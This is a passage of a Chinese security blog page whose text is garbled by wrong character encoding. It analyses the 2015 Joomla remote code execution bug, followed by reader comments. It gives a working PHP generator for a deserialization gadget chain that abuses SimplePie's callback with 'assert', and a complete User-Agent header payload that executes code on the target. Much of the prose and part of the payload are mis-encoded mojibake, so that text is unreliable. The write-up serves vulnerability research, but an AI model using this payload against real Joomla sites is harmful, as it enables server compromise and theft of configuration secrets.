<p>å¾ˆæ˜æ˜¾ï¼Œå…¶ä¸­è¿™ä¸¤ä¸ªcall_user_funcå°†æ˜¯è§¦å‘ä»£ç æ‰§è¡Œçš„å…ƒå‡¶ã€‚</p>
<p>æ‰€ä»¥ï¼Œæˆ‘å°†å…¶ä¸­ç¬¬äºŒä¸ªcall_user_funcçš„ç¬¬ä¸€ä¸ªå‚æ•°cache_name_functionï¼Œèµ‹å€¼ä¸ºassertï¼Œç¬¬äºŒä¸ªå‚æ•°èµ‹å€¼ä¸ºæˆ‘éœ€è¦æ‰§è¡Œçš„ä»£ç ï¼Œå°±æ„é€ å¥½äº†ä¸€ä¸ªã€å›è°ƒåé—¨ã€ã€‚</p>
<p>æ‰€ä»¥ï¼Œexpæ˜¯æ€ä¹ˆç”Ÿæˆçš„ï¼Œç»™å‡ºæˆ‘å†™çš„ç”Ÿæˆä»£ç ï¼š</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="c1">//header("Content-Type: text/plain");</span>
<span class="k">class</span> <span class="nc">JSimplepieFactory</span> <span class="p">{</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">JDatabaseDriverMysql</span> <span class="p">{</span>

<span class="p">}</span>
<span class="k">class</span> <span class="nc">SimplePie</span> <span class="p">{</span>
    <span class="k">var</span> <span class="nv">$sanitize</span><span class="p">;</span>
    <span class="k">var</span> <span class="nv">$cache</span><span class="p">;</span>
    <span class="k">var</span> <span class="nv">$cache_name_function</span><span class="p">;</span>
    <span class="k">var</span> <span class="nv">$javascript</span><span class="p">;</span>
    <span class="k">var</span> <span class="nv">$feed_url</span><span class="p">;</span>
    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">feed_url</span> <span class="o">=</span> <span class="s2">"phpinfo();JFactory::getConfig();exit;"</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">javascript</span> <span class="o">=</span> <span class="mi">9999</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_name_function</span> <span class="o">=</span> <span class="s2">"assert"</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sanitize</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">JDatabaseDriverMysql</span><span class="p">();</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">JDatabaseDriverMysqli</span> <span class="p">{</span>
    <span class="k">protected</span> <span class="nv">$a</span><span class="p">;</span>
    <span class="k">protected</span> <span class="nv">$disconnectHandlers</span><span class="p">;</span>
    <span class="k">protected</span> <span class="nv">$connection</span><span class="p">;</span>
    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">JSimplepieFactory</span><span class="p">();</span>
        <span class="nv">$x</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SimplePie</span><span class="p">();</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">connection</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">disconnectHandlers</span> <span class="o">=</span> <span class="p">[</span>
            <span class="p">[</span><span class="nv">$x</span><span class="p">,</span> <span class="s2">"init"</span><span class="p">],</span>
        <span class="p">];</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">JDatabaseDriverMysqli</span><span class="p">();</span>
<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span> 
</pre></div>
<p><a href="https://www.leavesongs.com/content/uploadfile/201512/46141451235941.jpg"><img alt="14501734764205.jpg" src="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/thum-46141451235941.jpg"/></a></p>
<p>å°†è¿™ä¸ªä»£ç ç”Ÿæˆçš„expï¼Œä»¥å‰é¢æåˆ°çš„æ³¨å…¥ã€|ã€çš„å˜æ¢æ–¹å¼ï¼Œå¸¦å…¥å‰é¢æåˆ°çš„user-agentä¸­ï¼Œå³å¯è§¦å‘ä»£ç æ‰§è¡Œã€‚</p>
<p>å…¶ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å°†<code>char(0)*char(0)</code>æ›¿æ¢æˆ\0\0\0ï¼Œå› ä¸ºåœ¨åºåˆ—åŒ–çš„æ—¶å€™ï¼Œprotectedç±»å‹å˜é‡ä¼šè¢«è½¬æ¢æˆ<code>\0*\0name</code>çš„æ ·å¼ï¼Œè¿™ä¸ªæ›¿æ¢åœ¨æºä»£ç ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼š</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$result</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'\0\0\0'</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">.</span> <span class="s1">'*'</span> <span class="o">.</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="nv">$result</span><span class="p">);</span> 
</pre></div>
<p>æ„é€ çš„æ—¶å€™é‡åˆ°ä¸€ç‚¹å°éº»çƒ¦ï¼Œé‚£å°±æ˜¯é»˜è®¤æƒ…å†µä¸‹SimplePieæ˜¯æ²¡æœ‰å®šä¹‰çš„ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘åœ¨è°ƒç”¨SimplePieä¹‹å‰å…ˆnewäº†ä¸€ä¸ªJSimplepieFactoryçš„åŸå› ï¼Œå› ä¸ºJSimplepieFactoryå¯¹è±¡åœ¨åŠ è½½æ—¶ä¼šè°ƒç”¨importå‡½æ•°å°†SimplePieå¯¼å…¥åˆ°å½“å‰å·¥ä½œç¯å¢ƒï¼š</p>
<p><a href="https://www.leavesongs.com/content/uploadfile/201512/58a21451235945.jpg"><img alt="14501735764788.jpg" src="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/thum-58a21451235945.jpg"/></a></p>
<p>è€ŒJSimplepieFactoryæœ‰autoloadï¼Œæ‰€ä»¥ä¸å†éœ€è¦å…¶ä»–includeæ¥å¯¹å…¶è¿›è¡ŒåŠ è½½ã€‚</p>
<p>ç»™å‡ºæˆ‘æœ€ç»ˆæ„é€ çš„POCï¼ˆæ—¢æ˜¯ä¸Šè¯‰phpä»£ç ç”Ÿæˆçš„POCï¼‰ï¼š</p>
<div class="codehilite"><pre><span></span><span class="nt">User-Agent</span><span class="o">:</span> <span class="nt">123</span><span class="err">}</span><span class="nt">__test</span><span class="o">|</span><span class="nt">O</span><span class="p">:</span><span class="nd">21</span><span class="o">:</span><span class="s2">"JDatabaseDriverMysqli"</span><span class="p">:</span><span class="nd">3</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="p">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">"\0\0\0a"</span><span class="p">;</span><span class="n">O</span><span class="p">:</span><span class="mi">17</span><span class="o">:</span><span class="s2">"JSimplepieFactory"</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="err">{</span><span class="p">}</span><span class="nt">s</span><span class="p">:</span><span class="nd">21</span><span class="o">:</span><span class="s2">"\0\0\0disconnectHandlers"</span><span class="o">;</span><span class="nt">a</span><span class="p">:</span><span class="nd">1</span><span class="o">:</span><span class="p">{</span><span class="n">i</span><span class="p">:</span><span class="mi">0</span><span class="p">;</span><span class="n">a</span><span class="p">:</span><span class="mi">2</span><span class="o">:</span><span class="err">{</span><span class="n">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="n">O</span><span class="p">:</span><span class="mi">9</span><span class="o">:</span><span class="s2">"SimplePie"</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="err">{</span><span class="n">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">"sanitize"</span><span class="p">;</span><span class="n">O</span><span class="p">:</span><span class="mi">20</span><span class="o">:</span><span class="s2">"JDatabaseDriverMysql"</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="err">{</span><span class="p">}</span><span class="nt">s</span><span class="p">:</span><span class="nd">5</span><span class="o">:</span><span class="s2">"cache"</span><span class="o">;</span><span class="nt">b</span><span class="p">:</span><span class="nd">1</span><span class="o">;</span><span class="nt">s</span><span class="p">:</span><span class="nd">19</span><span class="o">:</span><span class="s2">"cache_name_function"</span><span class="o">;</span><span class="nt">s</span><span class="p">:</span><span class="nd">6</span><span class="o">:</span><span class="s2">"assert"</span><span class="o">;</span><span class="nt">s</span><span class="p">:</span><span class="nd">10</span><span class="o">:</span><span class="s2">"javascript"</span><span class="o">;</span><span class="nt">i</span><span class="p">:</span><span class="nd">9999</span><span class="o">;</span><span class="nt">s</span><span class="p">:</span><span class="nd">8</span><span class="o">:</span><span class="s2">"feed_url"</span><span class="o">;</span><span class="nt">s</span><span class="p">:</span><span class="nd">37</span><span class="o">:</span><span class="s2">"ÏhÎ¹Ï„hÏƒÏ€pinfo();JFactory::getConfig();exit;"</span><span class="o">;</span><span class="err">}</span><span class="nt">i</span><span class="p">:</span><span class="nd">1</span><span class="o">;</span><span class="nt">s</span><span class="p">:</span><span class="nd">4</span><span class="o">:</span><span class="s2">"init"</span><span class="o">;</span><span class="err">}}</span><span class="nt">s</span><span class="p">:</span><span class="nd">13</span><span class="o">:</span><span class="s2">"\0\0\0connection"</span><span class="o">;</span><span class="nt">i</span><span class="p">:</span><span class="nd">1</span><span class="o">;</span><span class="err">}</span><span class="nt">Ã°</span><span class="err">ÂÂŒÂ†</span>
</pre></div>
<p><a href="https://www.leavesongs.com/content/uploadfile/201512/b3d41451235950.jpg"><img alt="14501837463659.jpg" src="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/thum-b3d41451235950.jpg"/></a></p>
</div>
</article>
<div id="reply-list">
<h1>è¯„è®º</h1>
<div class="row" id="comment-2364">
<div class="col-xs-2 col-sm-1 gravatar">
<img alt="" src="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
</div>
<div class="col-xs-10 col-sm-11">
<p class="comment-meta title">
<a href="" target="_blank">xxx</a>
<time datetime="2016å¹´6æœˆ16æ—¥ 17:38" itemprop="datePublished">
                            2016 å…­æœˆ 16 17:38
                        </time>
<a href="javascript:reply_to('2364', 'xxx')">å›å¤</a>
</p>
<p class="comment-meta">ä½ å¥½ï¼Œè¯·æ•™ä¸€ä¸‹<br>1ã€è¿™ä¸ªpocæ˜¯ä¸æ˜¯åªèƒ½åœ¨3.xä¸‹çš„ç‰ˆæœ¬æ‰§è¡Œï¼Ÿ<br/>2ã€é—®é¢˜1å¦‚æœæ˜¯çš„è¯ï¼Œåœ¨2.x ç‰ˆæœ¬pocå¦‚ä½•æ„é€ ï¼Œæˆ‘çœ‹äº†ä¸‹åœ¨2.xç‰ˆæœ¬ä¸‹æ²¡æœ‰jdatabasedrivermysqliç±»ï¼Œåœ¨2.xç‰ˆæœ¬ä¸jdatabasedrivermysqliç±»å¯¹åº”ç±»ä¸ºjdatabasemysqliç±»å’Œjdatabasemyssqlç±»çš„åˆ©ç”¨magic functionä¸èƒ½ç”¨äºæ„é€ popé“¾ï¼Œæ€ä¹ˆæ ·æ‰èƒ½æ‰¾åˆ°å¯ä»¥æ„é€ POPé“¾çš„ç±»?<br/>     é—®é¢˜1çš„ç­”æ¡ˆå¦‚æœæ˜¯å¦çš„è¯ï¼Œä¹Ÿèƒ½åœ¨2.xç‰ˆæœ¬æˆ–è€…1.xç‰ˆæœ¬ä¸‹æ‰§è¡Œçš„è¯ï¼Œæœ‰å¯èƒ½çš„åŸå› æ˜¯ä»€ä¹ˆï¼Ÿï¼Ÿ<br/>è°¢è°¢</br></p>
</div>
</div>
<div class="child-node">
<div class="row" id="comment-2368">
<div class="col-xs-2 col-sm-1 gravatar">
<img alt="" src="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
</div>
<div class="col-xs-10 col-sm-11">
<p class="comment-meta title">
<a href="https://www.leavesongs.com/" target="_blank">phithon</a>
<time datetime="2016å¹´6æœˆ24æ—¥ 11:47" itemprop="datePublished">
                            2016 å…­æœˆ 24 11:47
                        </time>
<a href="javascript:reply_to('2368', 'phithon')">å›å¤</a>
</p>
<p class="comment-meta">@xxxï¼šè¿™ä¸ªæˆ‘ä¹Ÿæ²¡ç ”ç©¶è¿‡ï¼Œå¸Œæœ›ä½ èƒ½å»ç ”ç©¶ä¸€ä¸‹ï¼Œå…±åŒå­¦ä¹ ~</p>
</div>
</div>
</div>
<div class="row" id="comment-2281">
<div class="col-xs-2 col-sm-1 gravatar">
<img alt="" src="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
</div>
<div class="col-xs-10 col-sm-11">
<p class="comment-meta title">
<a href="http://www.waitalone.cn" target="_blank">ç‹¬è‡ªç­‰å¾…</a>
<time datetime="2016å¹´1æœˆ5æ—¥ 17:50" itemprop="datePublished">
                            2016 ä¸€æœˆ 05 17:50
                        </time>
<a href="javascript:reply_to('2281', 'ç‹¬è‡ªç­‰å¾…')">å›å¤</a>
</p>
<p class="comment-meta">å¤§ç‰›ï¼Œåˆ†æçš„ä¸é”™ã€‚ã€‚ã€‚å­¦ä¹ äº†ã€‚</p>
</div>
</div>
<div class="row" id="comment-2273">
<div class="col-xs-2 col-sm-1 gravatar">
<img alt="" src="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/487f87505f619bf9ea08f26bb34f8118.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
</div>
<div class="col-xs-10 col-sm-11">
<p class="comment-meta title">
<a href="http://www.23.com" target="_blank">L</a>
<time datetime="2015å¹´12æœˆ28æ—¥ 17:40" itemprop="datePublished">
                            2015 åäºŒæœˆ 28 17:40
                        </time>
<a href="javascript:reply_to('2273', 'L')">å›å¤</a>
</p>
<p class="comment-meta">$this-&gt;connection = true;å»éªŒè¯çš„è¯<br/>è¿™æ ·çš„è¯åºåˆ—åŒ–ä¹‹ååº”è¯¥æ˜¯connection";b:1;}å§</p>
</div>
</div>
<div class="child-node">
<div class="row" id="comment-2277">
<div class="col-xs-2 col-sm-1 gravatar">
<img alt="" src="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
</div>
<div class="col-xs-10 col-sm-11">
<p class="comment-meta title">
<a href="http://www.leavesongs.com/" target="_blank">phithon</a>
<time datetime="2016å¹´1æœˆ1æ—¥ 15:35" itemprop="datePublished">
                            2016 ä¸€æœˆ 01 15:35
                        </time>
<a href="javascript:reply_to('2277', 'phithon')">å›å¤</a>
</p>
<p class="comment-meta">@Lï¼šæ˜¯å§ã€‚<br/>$this-&gt;connection = true;<br/>å’Œ<br/>$this-&gt;connection = 1;<br/>æ•ˆæœéƒ½ä¸€æ ·ï¼Œæˆ‘çš„POCé‡Œç”¨çš„åè€…ã€‚</p>
</div>
</div>
</div>
<div class="row" id="comment-2272">
<div class="col-xs-2 col-sm-1 gravatar">
<img alt="" src="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/6e52b9d5acf05d5d6d0dd021b81513c6.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
</div>
<div class="col-xs-10 col-sm-11">
<p class="comment-meta title">
<a href="" target="_blank">ä½›å±±ä¸é”ˆé’¢ç®¡</a>
<time datetime="2015å¹´12æœˆ28æ—¥ 16:57" itemprop="datePublished">
                            2015 åäºŒæœˆ 28 16:57
                        </time>
<a href="javascript:reply_to('2272', 'ä½›å±±ä¸é”ˆé’¢ç®¡')">å›å¤</a>
</p>
<p class="comment-meta">æ¥è®¿å•¦ï¼</p>
</div>
</div>
<div class="child-node">
<div class="row" id="comment-2278">
<div class="col-xs-2 col-sm-1 gravatar">
<img alt="" src="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/d832f116cafcd2608947371702255c2f.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
</div>
<div class="col-xs-10 col-sm-11">
<p class="comment-meta title">
<a href="" target="_blank">mr</a>
<time datetime="2016å¹´1æœˆ2æ—¥ 00:31" itemprop="datePublished">
                            2016 ä¸€æœˆ 02 00:31
                        </time>
<a href="javascript:reply_to('2278', 'mr')">å›å¤</a>
</p>
<p class="comment-meta">@ä½›å±±ä¸é”ˆé’¢ç®¡ï¼šæä¸é”ˆé’¢çš„éƒ½è·Ÿæå®‰å…¨æœ‰ä¸€è…¿äº†, æœ‰ç‚¹çœ‹ä¸æ‡‚å•Š......</p>
</div>
</div>
<div class="child-node">
<div class="row" id="comment-2280">
<div class="col-xs-2 col-sm-1 gravatar">
<img alt="" src="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/6e52b9d5acf05d5d6d0dd021b81513c6.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
</div>
<div class="col-xs-10 col-sm-11">
<p class="comment-meta title">
<a href="http://www.fssyxc.com" target="_blank">ä½›å±±ä¸é”ˆé’¢ç®¡</a>
<time datetime="2016å¹´1æœˆ4æ—¥ 09:31" itemprop="datePublished">
                            2016 ä¸€æœˆ 04 09:31
                        </time>
<a href="javascript:reply_to('2280', 'ä½›å±±ä¸é”ˆé’¢ç®¡')">å›å¤</a>
</p>
<p class="comment-meta">@mrï¼šå“ˆå“ˆå“ˆå“ˆã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p>
</div>
</div>
</div>
</div>
</div>
<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
<textarea cols="40" id="id_content" name="content" required="" rows="6">
</textarea>
<div class="row">
<div class="col-xs-4">
<input id="id_nickname" maxlength="64" name="nickname" placeholder="æ˜µç§°" required="" type="text"/>
</div>
<div class="col-xs-4">
<input id="id_email" maxlength="254" name="email" placeholder="é‚®ç®±ï¼ˆå¯ç•™ç©ºï¼‰" type="text"/>
</div>
<div class="col-xs-4">
<input id="id_url" maxlength="200" name="url" placeholder="é“¾æ¥ï¼ˆå¯ç•™ç©ºï¼‰" type="text"/>
</div>
</div>
<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="éªŒè¯ç " type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="c7297f2a9837d74ec7cbbde8b587a6d8f5bffa63"/>
</div><div class="col-xs-4">
<img alt="captcha" class="captcha" height="25" src="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/c7297f2a9837d74ec7cbbde8b587a6d8f5bffa63"/></div></div>
<div class="clearfix"></div>
<input class="ui-button ui-button-sgreen" type="submit" value="æäº¤"/>
<input id="id_archive" name="archive" type="hidden" value="374">
<input id="id_parent" name="parent" type="hidden"/>
<input name="csrfmiddlewaretoken" type="hidden" value="EiVORxhXWEZIrfD4cLn1FMEvIUwSuhkbcCgkF1tcnrT7rU1j02RLeqGARYZ0dL9l"/>
</input></form>
</div>
<footer id="footer">
<div class="footer-left">
    Copyright Â© 2017 Powered by talkbook
  </div>
<div class="footer-right">
<nav>
<ul>
<li><a href="/">é¦–é¡µ</a></li>
<li><a href="http://weibo.com/101yx" target="_blank">å¾®åš</a></li>
<li><a href="https://github.com/phith0n" target="_blank">é¡¹ç›®</a></li>
<li><a href="/template/change/">æ›´æ¢æ¨¡æ¿</a></li>
</ul>
</nav>
</div>
</footer>
<script src="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/main.js"></script>
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
<script src="./Joomlaè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æï¼ˆæ€»ç»“ï¼‰  ç¦»åˆ«æ­Œ/jquery.fancybox.pack.js"></script>
<script>
$(document).ready(function () {
    $("article a").each(function (i, e) {
        if(e.host != 'www.leavesongs.com') {
            e.target = '_blank';
        }
    });
    $("article img").each(function (i, e) {
        if(e.parentNode.tagName.toUpperCase() != 'A') {
            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
        } else {
            $(e.parentNode).addClass('fancybox');
        }
    });
    $('.fancybox').fancybox();
})
</script>
</body>
</html>